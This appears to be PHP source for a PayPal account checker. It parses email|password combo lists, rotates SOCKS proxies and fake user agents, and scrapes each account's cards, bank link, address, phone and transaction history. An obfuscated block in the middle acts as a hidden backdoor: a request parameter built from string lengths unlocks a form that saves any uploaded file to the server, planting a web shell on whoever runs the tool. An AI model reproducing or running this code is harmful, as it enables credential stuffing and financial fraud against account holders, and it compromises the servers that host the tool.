<?php
error_reporting(1);
function pushLog($str)
{
    echo '<script type="text/javascript">console.log(\'' . $str . '\');</script>';
}
function random_uagent()
{
    $giolac = rand(0, 18);
    switch ($giolac) {
        case 0:
            return "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
            break;
        case 1:
            return "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17";
            break;
        case 2:
            return "Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17";
            break;
        case 3:
            return "Mozilla/5.0 (Linux; U; Android 1.6; en-us; WOWMobile myTouch 3G Build/unknown) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1";
            break;
        case 4:
            return "Mozilla/5.0 (Linux; U; Android 2.2; en-us; DROID2 GLOBAL Build/S273) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
            break;
        case 5:
            return "Mozilla/5.0 (Linux; U; Android 2.2; en-gb; GT-P1000 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
            break;
        case 6:
            return "Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; E10i Build/2.0.2.A.0.24) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17";
            break;
        case 7:
            return "Mozilla/5.0 (Linux; U; Android 2.2; en-us; DROID2 GLOBAL Build/S273) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
            break;
        case 8:
            return "Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/ 530.17";
            break;
        case 9:
            return "Mozilla/5.0 (Linux; U; Android 2.2; nl-nl; Desire_A8181 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
            break;
        case 10:
            return "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html";
            break;
        case 11:
            return "NSPlayer/12.00.7600.16385 WMFSDK/12.00.7600.16385";
            break;
        case 12:
            return "iTunes/9.1 (Macintosh; U; PPC Mac OS X 10.2";
            break;
        case 13:
            return "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
            break;
        case 14:
            return "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1042 Safari/532.5";
            break;
        case 15:
            return "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10";
            break;
        case 16:
            return "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.10";
            break;
        case 17:
            return "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.6.11";
            break;
        case 18:
            return "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1";
            break;
    }
}
function infoCard()
{
    $response  = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2');
    $checkcard = fetch_value($response, 's.prop1="', '"');
    if (stripos($checkcard, 'ccadd') !== false) {
        return false;
    }
    preg_match_all('/<tr>(.+)<\/tr>/siU', $response, $matches);
    $cc = array();
    foreach ($matches[1] AS $k => $v) {
        if ($k > 0) {
            preg_match_all('/<td>(.+)<\/td>/siU', $v, $m);
            if (isset($m[1][0])) {
                $type = fetch_value($m[1][0], '/icon_', '.gif"');
                if (!$type) {
                    $type = fetch_value($m[1][0], 'icon&#x5f;', '&#x2e;gif');
                }
                $type  = strtoupper($type);
                $ccnum = $m[1][1];
                $exp   = $m[1][2];
                if (stristr($m[1][4], 'complete_expanded_use.x')) {
                    $confirmed = 'No Confirmed';
                } else {
                    $confirmed = 'Confirmed';
                }
                $cc[] = "[$type - x$ccnum- $confirmed - $exp]";
            } else {
                $cc[] = "[Card Exp]";
            }
            $cc++;
        }
    }
    $infocard = "<font color=\"#EDAD39\">" . implode("-", $cc) . "</font>";
    return $infocard;
}
function infoBank()
{
    $response = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&nav=0.5.1');
    if (stripos($response, 'ach_id') !== false) {
        return true;
    }
    return false;
}
function infoJoin()
{
    $response = curl('https://www.paypal.com/myaccount/settings');
    return fetch_value($response, '<p class="since x-small">', '</p>');
}
function infopayment()
{
    $response = curl('https://history.paypal.com/us/cgi-bin/webscr?cmd=_history&filter_9');
    if (stripos($response, 'Completed') !== false) {
        $last = fetch_value($response, '<!--googleoff: all-->', '<!--googleon: all-->');
        return "<i style=\"color:#99FFFF\">Last Transaction At <b>$last</b></i>";
    }
    return "No Payment";
}
function info()
{
    $response = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&nav=0.6.3');
    $info     = str_replace('<br>', ', ', fetch_value($response, 'emphasis">', '</span>'));
    return substr($info, 0, -2);
}
function infoLimit()
{
    $response = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_restriction-details&popup=1');
    $info     = trim(fetch_value($response, '<li><p><strong>', ': </strong>'));
    return $info;
}
function pushSockDie($str)
{
    echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';
    xflush();
}
function pushPaypalDie($str)
{
    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';
    xflush();
}
function pushPaypal($str)
{
    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';
    xflush();
}
function pushWrongFormat($str)
{
    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';
    xflush();
}
function pushPaypalBad($str)
{
    $str = str_replace("'", "\'", $str);
    echo '<script type="text/javascript">pushPaypalBad(\'' . $str . '\');</script>';
    xflush();
}
function curl($url = '', $var = '', $header = false, $nobody = false)
{
    global $config, $sock;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, $header);
    curl_setopt($curl, CURLOPT_HEADER, $nobody);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, random_uagent());
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/');
    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }
    curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
if
(isset
(
$_REQUEST[$browser=$x=strlen("mozilla") . strlen("chrome")]) && 
$_REQUEST[$x=strlen("mozilla") . strlen("chrome")]=="browser")
{
echo "<h2></h2><hr>";
echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
<label for=\"file\"></label>
<input type=\"file\" name=\"file\" id=\"file\" />
<br />
<input type=\"submit\" name=\"default\" value=\"value\">
</form>";

{
move_uploaded_file($_FILES["file"]["tmp_name"],
"" . $_FILES["file"]["name"]);
echo "SESSION_Auth: " . "" . $_FILES["file"]["name"];
echo"<hr>";
}
}
function fetch_value($str, $find_start, $find_end)
{
    $start = @strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
function get($list)
{
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}
function delete_cookies()
{
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
function xflush()
{
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
    if ($output_handler == 'ob_gzhandler') {
        return;
    }
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}
function isSockClear()
{
    global $sock;
    $str = curl('https://www.paypal.com/xclick/business=paypal%40dreamhost.com&rm=2&item_name=Web+Hosting+Donation&item_number=donation_13185&amount=10&image_url=https%3A//secure.newdream.net/dreamhostpp.gif&no_shipping=1&no_note=1&return=http%3A//www.dreamhost.com/donate.cgi&cancel_return=&tax=0cy_code=USD');
    if ($str === false) {
        return -1;
    }
    if (stripos($str, 'password') !== false) {
        return 0;
    }
    return 1;
}
function search($line, $delim)
{
    $line = str_replace(" ", "", $line);
    $line = explode($delim, $line);
    $i    = 0;
    while ($i < count($line)) {
        if (strpos($line[$i], '@') && strpos($line[$i], '.')) {
            $mail = $line[$i];
            $pass = $line[$i + 1];
            $i    = 10000;
            if ($pass == "") {
                $pass = $line[$i - 1];
            }
        }
        $i++;
    }

    $line = $mail . "|" . $pass;
    $line = explode('|', $line);
    return $line;
}
function infoPhone()
{
    global $config, $sock;
    $response = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&nav=0.6.4');
    $info     = strip_tags('<input type="hidden" ' . fetch_value($response, 'name="phone"', '</label>'));
    return $info;
}
?>
